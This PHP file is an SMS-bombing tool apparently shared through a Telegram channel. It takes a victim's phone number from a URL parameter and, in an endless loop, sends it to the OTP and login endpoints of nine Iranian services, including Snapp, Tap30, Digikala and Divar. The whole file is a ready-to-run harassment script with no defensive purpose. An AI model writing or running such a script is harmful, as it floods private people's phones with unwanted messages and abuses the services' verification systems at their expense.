<?php
//------------------------
// Channel : @LintoCode
// Developer : @DevMrAmir
//------------------------
set_time_limit(1000);
if (isset($_GET['target'])) {
	$target = $_GET['target'];
	while (True) {
		$url = 'https://app.snapp.taxi/api/api-passenger-oauth/v2/otp';
		# Create a new cURL resource
		$ch = curl_init($url);
		#Setup request to send json via POST
		$payload = json_encode(array("cellphone" => "+98".$target));
		# Attach encoded JSON string to the POST fields
		curl_setopt($ch, CURLOPT_POSTFIELDS, $payload);
		#Set the content type to application/json
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		# Return response instead of outputting
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		# Execute the POST request
		$result = curl_exec($ch);
		# Close cURL resource
		curl_close($ch);
		#Tap30 Sending
		# API URL
		$url2 = 'https://tap33.me/api/v2/user';
		// Create a new cURL resource
		$ch2 = curl_init($url2);
		// Setup request to send json via POST
		$payload2 = '{"credential":{"phoneNumber":"0'.$target.'","role":"PASSENGER"}}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch2, CURLOPT_POSTFIELDS, $payload2);
		// Set the content type to application/json
		curl_setopt($ch2, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result2 = curl_exec($ch2);
		// Close cURL resource
		curl_close($ch2);
		//AliBaba
		// API URL
		$url3 = 'https://ws.alibaba.ir/api/v3/account/mobile/otp';
		// Create a new cURL resource
		$ch3 = curl_init($url3);
		// Setup request to send json via POST
		$payload3 = '{phoneNumber: "0'.$target.'"}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch3, CURLOPT_POSTFIELDS, $payload3);
		// Set the content type to application/json
		curl_setopt($ch3, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch3, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result3 = curl_exec($ch3);
		// Close cURL resource
		curl_close($ch3);
		//DigiKala
		$url4 = 'https://www.digikala.com/ajax/users/login-with-otp/send-confirm-code/';
		$params = [
			'phone_number' => '0'.$target
		];
		$ch4 = curl_init($url4);
		$parameters = http_build_query($params);
		curl_setopt($ch4, CURLOPT_POST, true);
		curl_setopt($ch4, CURLOPT_POSTFIELDS, $parameters);
		curl_setopt($ch4, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch4);
		curl_close($ch4);
		//echarge
		$url5 = 'https://www.echarge.ir/m/login?length=19';
		$params5 = [
			'phoneNumber' => '0'.$target
		];
		$ch5 = curl_init($url5);
		$parameters5 = http_build_query($params5);
		curl_setopt($ch5, CURLOPT_POST, true);
		curl_setopt($ch5, CURLOPT_POSTFIELDS, $parameters5);
		curl_setopt($ch5, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch5);
		curl_close($ch5);
		//Divar
		// API URL
		$url6 = 'https://api.divar.ir/v5/auth/authenticate';
		// Create a new cURL resource
		$ch6 = curl_init($url6);
		// Setup request to send json via POST
		$payload6 = '{"phone":"'.$target.'"}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch6, CURLOPT_POSTFIELDS, $payload6);
		// Set the content type to application/json
		curl_setopt($ch6, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch6, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result6 = curl_exec($ch6);
		// Close cURL resource
		curl_close($ch6);
		//AloPark
		$url7 = 'https://www.alopark.com/driver/Login/Register';
		$params7 = [
			'Mobile' => '0'.$target
		];
		$ch7 = curl_init($url7);
		$parameters7 = http_build_query($params7);
		curl_setopt($ch7, CURLOPT_POST, true);
		curl_setopt($ch7, CURLOPT_POSTFIELDS, $parameters7);
		curl_setopt($ch7, CURLOPT_RETURNTRANSFER, true);
		curl_exec($ch7);
		curl_close($ch7);
//------------------------
// Channel : @LintoCode
// Developer : @DevMrAmir
//------------------------
		//DarmanKade
		$url8 = 'https://base.darmankade.com/v1/PatientLogin';
		// Create a new cURL resource
		$ch8 = curl_init($url8);
		// Setup request to send json via POST
		$payload8 = '{"Mobile":"0'.$target.'"}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch8, CURLOPT_POSTFIELDS, $payload8);
		// Set the content type to application/json
		curl_setopt($ch8, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch8, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result8 = curl_exec($ch8);
		// Close cURL resource
		curl_close($ch8);

		//Spard
		$url9 = 'https://app.espard.com/api/v1/auth/identify-by-mobile';
		// Create a new cURL resource
		$ch9 = curl_init($url9);
		// Setup request to send json via POST
		$payload9 = '{"data":{"mobile":"'.$target.'"},"oneSignalPlayerId":"","appVersion":"1.5.0","deviceId":"01B30DE7-EC61-438A-BDB3-FC6910AE7E5E","deviceInfo":"x86_64","deviceToken":"","clientId":"com.espard.customer","platform":"web","osVersion":"10.2","timeZone":"GMT+3:30","time":"1597042718355"}';
		// Attach encoded JSON string to the POST fields
		curl_setopt($ch9, CURLOPT_POSTFIELDS, $payload9);
		// Set the content type to application/json
		curl_setopt($ch9, CURLOPT_HTTPHEADER, array('Content-Type:application/json'));
		// Return response instead of outputting
		curl_setopt($ch9, CURLOPT_RETURNTRANSFER, true);
		// Execute the POST request
		$result9 = curl_exec($ch9);
		// Close cURL resource
		curl_close($ch9);
	}
	
}
//------------------------
// Channel : @LintoCode
// Developer : @DevMrAmir
//------------------------
?>